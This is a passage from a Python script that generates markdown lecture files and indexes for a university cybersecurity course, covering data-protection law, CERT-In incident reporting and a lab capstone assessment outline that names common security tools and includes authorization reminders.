                ("DPDP Act 2023", "Personal data processing obligations; consent; data principal rights; penalties up to ₹250 crore."),
                ("Countermeasures (organizational)", "- Maintain lawful interception policies.\n- Data Processing Agreements with vendors.\n- Incident response aligned with CERT-In reporting.\n- Legal review before pentesting contracts."),
            ]),
            ("L35", "incident-reporting", "Digital Evidence, Incident Reporting & CERT-In", [
                ("Purpose", "Proper evidence handling and timely reporting are legal and operational requirements."),
                ("Chain of custody", "1. Identify and isolate affected systems.\n2. Photograph/document state.\n3. Hash all acquired images: `sha256sum image.dd`.\n4. Log every person who handles evidence.\n5. Store on write-once media or WORM storage.\n6. Maintain custody transfer forms."),
                ("CERT-In reporting (2022 directions)", "- Report cyber incidents within **6 hours** for: data breaches, ransomware, DDoS on critical infra, etc.\n- Log retention: 180 days minimum.\n- NTP synchronization required."),
                ("Countermeasures", "- Pre-draft incident response plan (IRP).\n- Tabletop exercises quarterly.\n- Retainer with legal counsel.\n- Preserve logs centrally (SIEM) before attacker deletion."),
            ]),
            ("L36", "course-synthesis-capstone", "Course Synthesis — Tool Chain Integration & Assessment", [
                ("Purpose", "Integrate all tools into an end-to-end assessment workflow — capstone for nou26_ge86."),
                ("Capstone scenario", "Assess a small e-commerce lab environment:\n1. **Recon:** Nmap network scan.\n2. **Enum:** Gobuster + Nikto on web server.\n3. **Vuln scan:** OpenVAS full scan.\n4. **Web test:** ZAP active scan + sqlmap on injection point.\n5. **Wireless:** Document WPA configuration (if applicable).\n6. **Defense:** Write Snort rule for attack traffic observed.\n7. **Firewall:** iptables rules to block attacker IP.\n8. **Credentials:** Demonstrate Hydra risk; recommend MFA.\n9. **Report:** CVSS-rated findings + remediation + legal disclaimer."),
                ("Report template", "1. Executive summary\n2. Scope and authorization\n3. Methodology (tools + versions)\n4. Findings table (ID, severity, CVSS, evidence, recommendation)\n5. Conclusion and re-test plan"),
                ("Assessment prep", "- Review all 36 lecture tool summaries.\n- Watch BAOU YouTube channel: scsbaou5615.\n- Complete PGDCS-103 Block review questions.\n- Practice in isolated VMs only."),
            ]),
        ],
    },
}


def lecture_md(num, slug, title, sections):
    lines = [f"# {num}: {title}\n"]
    for heading, body in sections:
        lines.append(f"## {heading}\n\n{body}\n")
    lines.append("---\n\n*Lab reminder: test only on authorized systems. Unauthorized access violates the IT Act, 2000.*\n")
    return "\n".join(lines)


def volume_index(vol_key, vol_data):
    lines = [
        f"# {vol_key.replace('-', ' ').title()} Index — {vol_data['title']}",
        f"\n**Lectures:** {vol_data['range']}\n",
        "| Lecture | File | Title |",
        "|---------|------|-------|",
    ]
    for num, slug, title, _ in vol_data["lectures"]:
        lines.append(f"| {num} | [{num}-{slug}.md]({num}-{slug}.md) | {title} |")
    lines.append("\n## Tools covered\n")
    tools = {
        "vol-01": "Nmap, Netcat, Wireshark, MITRE ATT&CK, iptables, UFW, Windows Firewall",
        "vol-02": "Airodump-ng, Aircrack-ng, Nikto, OWASP ZAP, Gobuster, dirb, ffuf, sqlmap",
        "vol-03": "ZAP, Snort, Suricata, OpenVAS/GVM, CVSS, ClamAV, Cuckoo Sandbox",
        "vol-04": "OpenSSL, testssl.sh, SET, Gophish, theHarvester, John the Ripper, Hydra, fail2ban",
    }
    lines.append(tools.get(vol_key, ""))
    lines.append(f"\n## Consolidated volume\n\nSee [`../{vol_key}.md`](../{vol_key}.md) for PDF export.\n")
    return "\n".join(lines) + "\n"


def consolidated_volume(vol_key, vol_data):
    lines = [
        f"# {vol_key.replace('-', ' ').title()}: {vol_data['title']}",
        f"\n**Course:** nou26_ge86 | **Lectures:** {vol_data['range']}\n",
        f"**Instructor:** Prof. Dr. Nilesh K. Modi | IGNOU/BAOU\n",
        "---\n",
    ]
    for num, slug, title, sections in vol_data["lectures"]:
        lines.append(lecture_md(num, slug, title, sections))
        lines.append("\n")
    return "\n".join(lines)


def main():
    for vol_key, vol_data in LECTURES.items():
        vol_dir = BASE / vol_key
        vol_dir.mkdir(parents=True, exist_ok=True)

        for num, slug, title, sections in vol_data["lectures"]:
            path = vol_dir / f"{num}-{slug}.md"
            path.write_text(lecture_md(num, slug, title, sections), encoding="utf-8")
            print(f"Wrote {path}")

        index_path = vol_dir / ".index.md"
        index_path.write_text(volume_index(vol_key, vol_data), encoding="utf-8")
        print(f"Wrote {index_path}")

        vol_md = BASE / f"{vol_key}.md"
        vol_md.write_text(consolidated_volume(vol_key, vol_data), encoding="utf-8")
        print(f"Wrote {vol_md}")

    print("Done.")


if __name__ == "__main__":
    main()
